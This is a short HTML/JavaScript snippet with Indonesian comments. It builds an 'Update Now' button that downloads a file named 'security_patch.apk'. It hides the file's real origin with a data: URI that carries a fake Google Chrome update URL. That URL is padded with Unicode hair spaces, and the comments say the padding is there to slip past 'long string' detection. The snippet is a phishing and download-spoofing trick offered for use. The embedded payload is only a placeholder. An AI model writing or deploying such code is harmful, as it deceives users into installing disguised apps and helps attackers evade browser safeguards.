<button id="dl_btn">Update Now</button>

<script>
  document.getElementById('dl_btn').onclick = () => {
    const filename = "security_patch.apk";
    
    // Trik: Gunakan domain palsu sebagai bagian dari MIME type atau path data
    // Chrome terkadang mengekstrak string yang menyerupai domain di awal URI
    const fakeDomain = "https://www.google.com/chrome/update/stable/release/index.html";
    
    // Gunakan spasi Unicode yang lebih kecil (Hair Space \u200A) 
    // agar tidak memicu deteksi 'long string' tapi tetap mendorong teks asli
    const padding = "\u200A".repeat(300);
    
    // Kita buat 'data' URI yang terlihat seperti path URL
    const payload = `data:text/html;base64,ZXN0?source=${fakeDomain}${padding}#${fakeDomain}`;

    const a = document.createElement('a');
    a.href = payload;
    a.download = filename;
    a.click();
  };
</script>
